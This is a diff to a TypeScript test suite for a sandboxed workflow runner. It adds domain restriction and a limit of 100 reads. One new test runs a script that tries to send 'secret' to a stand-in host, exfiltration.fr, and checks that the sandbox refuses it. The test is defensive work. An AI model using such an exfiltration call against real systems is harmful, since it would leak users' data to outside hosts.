@@ -99,7 +99,7 @@ interface Bench {
 async function bench(
   workflow: unknown,
   files: Record<string, string> = {},
-  o: { account?: string[]; public?: string[]; grant?: { profile: string } | null; bridge?: FakeBridge; memory?: BlocksMemory; delayMs?: number; launch?: ProcessLauncher } = {},
+  o: { account?: string[]; public?: string[]; grant?: { profile: string } | null; bridge?: FakeBridge; memory?: BlocksMemory; delayMs?: number; launch?: ProcessLauncher; restricted?: true } = {},
 ): Promise<Bench> {
   const folder = await tempFolder();
   for (const [name, content] of Object.entries(files)) await writeFile(join(folder, name), content);
@@ -116,6 +116,8 @@ async function bench(
       previous: null,
       memory: o.memory ?? {},
       sources: { account: o.account ?? [], public: o.public ?? [] },
+      // Like an owner seeded at the update; `restricted`: one approved through the card, held to its declared domains.
+      ...(o.restricted ? {} : { unrestricted: true }),
       grant: async () => (o.grant === undefined ? null : o.grant),
       onProfileDenied: async () => {
         b.denialPending++;
@@ -495,6 +497,34 @@ describe("executerWorkflow", () => {
     expect(bridge.calls.filter((a) => a.method === "readPageInvisible")).toHaveLength(0);
   });
 
+  it("without account, held to its declared domains: an undeclared host is refused, the declared read gets the list", async () => {
+    const web = await webServer({ "/": (res) => res.end("ok") });
+    const bridge = new FakeBridge([], { active: null, allow: false, read: { pages: [{ url: "https://lu.fr/", title: "Lu", text: "", links: [] }] } });
+    const b = await bench(
+      chain("a"),
+      {
+        "a.mjs": `const essai = (p) => p.then((x) => x, (e) => "refus: " + e.message);
+        export default async (e, w) => [
+          await essai(w.fetch("https://exfiltration.fr/?d=secret")),
+          await essai(w.readPage("https://exfiltration.fr/")),
+          await essai(w.fetch("${web.url}/")),
+          await essai(w.readPage("https://lu.fr/").then((p) => p.title)),
+        ];`,
+      },
+      { public: ["127.0.0.1", "lu.fr"], bridge: bridge, restricted: true },
+    );
+    const r = await runWorkflow(b.ctx, b.infra);
+    const [external, page, declared, read] = (r.issue.t === "end" ? r.issue.output.value : []) as string[];
+    expect(external).toBe("refus: Domaine non déclaré : exfiltration.fr");
+    expect(page).toBe("refus: Domaine non déclaré : exfiltration.fr");
+    expect(declared).toBe("ok");
+    expect(read).toBe("Lu");
+    expect(web.requests).toHaveLength(1);
+    const reads = bridge.calls.filter((a) => a.method === "readPageInvisible");
+    expect(reads).toHaveLength(1);
+    expect(JSON.stringify(reads[0]!.args)).toContain('"domains":["127.0.0.1","lu.fr"]');
+  });
+
   it("timeout exceeded: in-flight AI calls are abandoned", async () => {
     const b = await bench(chain("a"), { "a.mjs": `export default (e, w) => Promise.all([w.kev("s", {}), w.gemma("p")]);` }, { delayMs: 600 });
     const signals: (AbortSignal | undefined)[] = [];
@@ -855,6 +885,16 @@ describe("executerWorkflow: web search and open reads", () => {
     expect(value(r)).toEqual([`erreur: ${UNREADABLE_RESULTS}`, []]);
   });
 
+  it("widget without web: the 101st fetch throws TOO_MANY_READS too", async () => {
+    const web = await webServer({ "/f": (res) => res.end("x") });
+    const { b } = await webBench(
+      `export default async (e, w) => { let n = 0; try { for (let i = 0; i < 150; i++) { await w.fetch("${web.url}/f"); n++; } } catch (err) { return n + " " + err.message; } return "fini"; };`,
+      {},
+    );
+    expect(value(await runWorkflow(b.ctx, b.infra))).toBe(`100 ${TOO_MANY_READS}`);
+    expect(web.requests).toHaveLength(100);
+  });
+
   it("web widget: the 101st open read (pages and feeds) throws TOO_MANY_READS", async () => {
     const web = await webServer({ "/f": (res) => res.end("<rss><channel><item><title>T</title><link>https://x.example/</link></item></channel></rss>") });
     const { pacing, waits } = fakePacing();
@@ -974,17 +1014,17 @@ describe("executerWorkflow: web search and open reads", () => {
     expect(web.requests).toEqual([]);
   });
 
-  it("widget without web: 150 reads go through, no throttle wait", async () => {
+  it("widget without web: 100 reads go through with no throttle wait, the 101st is refused", async () => {
     const spy = new Pacing({ wait: async () => { throw new Error("aucune attente attendue"); } });
     const read = vi.spyOn(spy, "read");
     const search = vi.spyOn(spy, "search");
     const { b, bridge } = await webBench(
-      `export default async (e, w) => { for (let i = 0; i < 150; i++) await w.readPage("https://pages.example/" + i); return "fini"; };`,
+      `export default async (e, w) => { let n = 0; try { for (let i = 0; i < 150; i++) { await w.readPage("https://pages.example/" + i); n++; } } catch (err) { return n + " " + err.message; } return "fini"; };`,
       { pacing: spy },
     );
     const r = await runWorkflow(b.ctx, b.infra);
-    expect(value(r)).toBe("fini");
-    expect(bridge.calls.filter((a) => a.method === "readPageInvisible")).toHaveLength(150);
+    expect(value(r)).toBe(`100 ${TOO_MANY_READS}`);
+    expect(bridge.calls.filter((a) => a.method === "readPageInvisible")).toHaveLength(100);
     expect(read).not.toHaveBeenCalled();
     expect(search).not.toHaveBeenCalled();
   });
